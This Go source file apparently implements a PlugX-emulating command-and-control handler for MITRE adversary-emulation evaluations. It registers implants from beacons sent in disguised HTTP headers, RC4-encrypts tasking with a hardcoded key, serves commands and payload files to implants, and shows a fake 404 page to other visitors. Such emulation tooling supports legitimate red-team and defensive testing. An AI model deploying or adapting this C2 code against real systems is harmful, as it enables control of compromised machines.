package plugx

import (
    "context"
    "encoding/json"
    "encoding/base64"
    "crypto/rc4"
    "encoding/binary"
    "strconv"
    "bytes"
    "errors"
    "fmt"
    "net/http"
    "strings"
    "time"
    "evals.mitre.org/control_server/config"
    "evals.mitre.org/control_server/handlers/base_handler"
    "evals.mitre.org/control_server/handlers/handler_manager"
    "evals.mitre.org/control_server/handlers/handler_util"
    "evals.mitre.org/control_server/logger"
    "evals.mitre.org/control_server/sslcerts"

    "github.com/gorilla/mux"
)

const (
    HANDLER_NAME = "plugx"
    ENCRYPTION_KEY = "secret_key"
    // Implant Commands
    beacon       = "0x00"
    testerino    = "0x99"
)

type TaskData struct {
    ID      string `json:"id"`      // 0x1234/1234
    Args    string `json:"args"`    // task arg string (e.g. command line to execute, destination file path for downloads)
    File    string `json:"file"`    // file name to download
}

type plugxHandler struct {
    baseHandler        *base_handler.BaseHandlerUtil
    wrappedFuncHandles *WrappedFuncHandles

    // to be initialized after init()
    server *http.Server
}

type WrappedFuncHandles struct {
    randStringGetter handler_util.RandAlphanumericStringGetter
}

// Factory method for creating a Plug X C2 handler
func plugxHandlerFactory(funcHandles *WrappedFuncHandles) *plugxHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &plugxHandler{
        baseHandler:        baseHandler,
        wrappedFuncHandles: funcHandles,
    }
}

// Creates and adds the Plug X C2 handler to the map of available C2 handlers.
func init() {
    // use production function wrappers
    wrappedFuncHandles := &WrappedFuncHandles{
        randStringGetter: handler_util.GetRandomAlphanumericString,
    }
    handler_manager.RegisterAvailableHandler(plugxHandlerFactory(wrappedFuncHandles))
}

func (s *plugxHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the C2 handler
func (s *plugxHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // process the information from the configuration entry and use it to initialize the remaining handler variables, if any

    // set the bind and REST API addresses for the base handler
    err := s.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    s.baseHandler.SetRestApiAddr(restAddress)
    s.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", s.baseHandler.Name, s.baseHandler.BindAddr)

    // set the https bool to true/false
    https, ok := configEntry["https"]
    if !ok {
        https = false
        return errors.New(fmt.Sprintf("Config entry did not contain a HTTPS value.)"))
    }
    useHTTPS, _ := https.(bool)

    // initialize URL router
    urlRouter := mux.NewRouter()

    // HTTP routes to their functions - these functions will handle things like fetching tasks and files, uploading task results and files
    urlRouter.HandleFunc("/", s.HandleGETBeacon).Methods("GET")

    s.server = &http.Server{
        Addr:         s.baseHandler.BindAddr,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }

    if useHTTPS {
        cert_file, ok := configEntry["cert_file"]
        if !ok {
            cert_file = ""
        }
        certFile, _ := cert_file.(string)
        key_file, ok := configEntry["key_file"]
        if !ok {
            key_file = ""
        }
        keyFile, _ := key_file.(string)

        needToGenCert := sslcerts.CheckCert(certFile, keyFile)
        if needToGenCert {
            certFile, keyFile = sslcerts.GenerateSSLcert("plugx", s.baseHandler.BindAddr)
        }
        logger.Info(fmt.Sprintf("\n%s HTTPS cert: %s\n%s HTTPS key: ./%s", HANDLER_NAME, certFile, HANDLER_NAME, keyFile))

        // start handler in goroutine so it doesn't block
        go func() {
            if err := s.server.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
                logger.Error(err)
            }
        }()
    } else {
        // start handler in goroutine so it doesn't block
        go func() {
            if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
                logger.Error(err)
            }
        }()
    }

    return nil
}

// StopHandler stops the C2 handler
func (s *plugxHandler) StopHandler() error {
    s.baseHandler.HandlerLogInfo("Stopping %s Handler", s.baseHandler.Name)

    context, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    if err := s.server.Shutdown(context); err != nil {
        s.baseHandler.HandlerLogInfo("Error during shutdown: %v", err)
        return err
    }
    return nil
}

// Handle GET requests/beacons
func (s *plugxHandler) HandleGETBeacon(w http.ResponseWriter, r *http.Request) {
    implantId := r.Header.Get("Sec-Dest")
    implantData := r.Header.Get("Sec-Site")
    if implantData != implantId {
        encryptedData, err := base64.StdEncoding.DecodeString(implantData)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to base64 decode: %v", err)
            return
        }
        decrypted, err := CryptRC4(encryptedData)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to decrypt beacon: %v", err)
            return
        }

        s.baseHandler.HandlerLogSuccess("Reply from implant: %s\n  %s", implantId, decrypted)
    }


    if implantId != "" {
        // register new implant
        if !s.baseHandler.HasImplantSession(implantId) {
            s.baseHandler.HandlerLogInfo("Received first-time beacon from %s. Creating a new implant session.", implantId)
            sessionData := map[string]string{"guid": implantId}
            err := s.baseHandler.RegisterNewImplant(implantId, sessionData)
            if err != nil {
                s.baseHandler.HandlerLogError("Failed to register implant session for implant ID %s: %s", implantId, err.Error())
                s.HandleNullReplies(w)
                return
            }
            w.Write([]byte("success"))
        } else {
            // implant exists, skip registration
            s.baseHandler.HandlerLogInfo("Beacon from %s.", implantId)
            s.HandleTask(w, implantId)
            return
        }

    }

}

// encrypt/decrypt packet data
func CryptRC4(packetData []byte) ([]byte, error) {
    crypted := make([]byte, len(packetData))
    key := []byte(ENCRYPTION_KEY)
    cipher, err := rc4.NewCipher(key)
    if err != nil {
        return nil, errors.New(fmt.Sprintf("Failed to initialize RC4: %v", err))
    }
    cipher.XORKeyStream(crypted, packetData)
    return crypted, nil
}

// Handle GET requests for current implant task / heartbeat
func (s *plugxHandler) HandleTask(w http.ResponseWriter, implantId string) {
    taskString, err := s.baseHandler.GetImplantTask(implantId)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to get task for implant ID %s: %s", implantId, err.Error())
        s.HandleNullReplies(w)
        return
    }

    // Send heartbeat response if task is empty
    if taskString == "" {
        s.HandleNullReplies(w)
        return
    }

    // Handle task format errors
    var taskInfo TaskData
    err = json.Unmarshal([]byte(taskString), &taskInfo)
    if err != nil {
        s.baseHandler.HandlerLogError("Unable to format task for implant ID %s: %s", implantId, err.Error())
        s.HandleNullReplies(w)
        return
    }

    // Parse ID string
    var id64 uint64
    if strings.HasPrefix(taskInfo.ID, "0x") {
        id64, err = strconv.ParseUint(taskInfo.ID[2:], 16, 32)
    } else {
        id64, err = strconv.ParseUint(taskInfo.ID, 10, 16)
    }
    if err != nil {
        s.baseHandler.HandlerLogError("Command ID not included in task string for implant ID: %s", implantId)
        s.HandleNullReplies(w)
        return
    }

    // If file name is provided, include file data in response contents
    var contentData []byte
    if len(taskInfo.File) > 0 {
        s.baseHandler.HandlerLogDebug("Grabbing payload file %s to include in response", taskInfo.File)
        contentData, err = s.baseHandler.GetFileFromRestServer(taskInfo.File)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to read payload file %s for implant ID: %s Error: %s", taskInfo.File, implantId, err.Error())
            s.HandleNullReplies(w)
            return
        }
    }

    s.baseHandler.HandlerLogDebug("Building response packet with ID %d, args: %s, content length: %d", id64, taskInfo.Args, len(contentData))
    respPacket, err := BuildPacket(uint32(id64), taskInfo.Args, contentData)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to build packet for implant ID: %s Error: %s", implantId, err.Error())
        s.HandleNullReplies(w)
        return
    }
    s.baseHandler.HandlerLogInfo("Tasking implant %s with task (id %d): %s", implantId, id64, taskString)

    encryptedPacket, err := CryptRC4(respPacket)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to encrypt packet for implant ID: %s Error: %s", implantId, err.Error())
        s.HandleNullReplies(w)
        return
    }

    encodedRespPacket := base64.StdEncoding.EncodeToString(encryptedPacket)
    w.Write([]byte(encodedRespPacket))
}


// Catchall for conditions outside of tasking
func (s *plugxHandler) HandleNullReplies(w http.ResponseWriter) {
    w.WriteHeader(http.StatusOK)
    resp := []byte("Base null response")
    packet, err := BuildPacket(0, "", resp)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to build null response packet. Error: %s", err.Error())
        w.Write(resp)
        return
    }
    encrypted, err := CryptRC4(packet)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to encrypt null response. Error: %s", err.Error())
        w.Write(resp)
        return
    }

    encoded := base64.StdEncoding.EncodeToString(encrypted)
    w.Write([]byte(encoded))

    return
}

// 404 anything tha isnt from an implant
func HandleErrorReplies(w http.ResponseWriter) {
    w.WriteHeader(http.StatusNotFound)
    w.Write([]byte("<html><head><title>404 NOT FOUND</title></head><body>Uh oh! Looks like the page you're looking for doesnt exist!</body></html>"))
    return
}

// BuildPacket is abased on the struct in the Implant:
// struct c2_packet {
//     uint32_t id;            // instruction identifier
//     uint32_t argLength;     // arg length
//     uint32_t contentLength; // content length
//     char* args;             // optional: cmd string
//     uint8_t* content;       // optional: binary blob
// };
func BuildPacket(id uint32, args string, contentBytes []byte) ([]byte, error) {
    argBytes := []byte(args)
    if len(args) > 0 {
        argBytes = append(argBytes, 0) // null-terminate string
    }
    argLength := uint32(len(argBytes)) // when we take multiple args will adjust for arg array.
    contentLength := uint32(len(contentBytes))

    buf := new(bytes.Buffer)

    if err := binary.Write(buf, binary.LittleEndian, id); err != nil {
        return nil, errors.New(fmt.Sprintf("Failed to write implant ID to packet: %d", id))
    }

    if err := binary.Write(buf, binary.LittleEndian, argLength); err != nil {
        return nil , errors.New(fmt.Sprintf("Failed to write argument length to packet: %d", argLength))
    }

    if err := binary.Write(buf, binary.LittleEndian, contentLength); err != nil {
        return nil, errors.New(fmt.Sprintf("Failed to write content length to packet: %d", contentLength))
    }

    if _, err := buf.Write(argBytes); err != nil {
        return nil, errors.New("Failed to write argument bytes to packet")
    }

    if contentLength > 0 {
        if _, err := buf.Write(contentBytes); err != nil {
            return nil, errors.New("Failed to write content bytes to packet")
        }
    }

    return buf.Bytes(), nil
 }
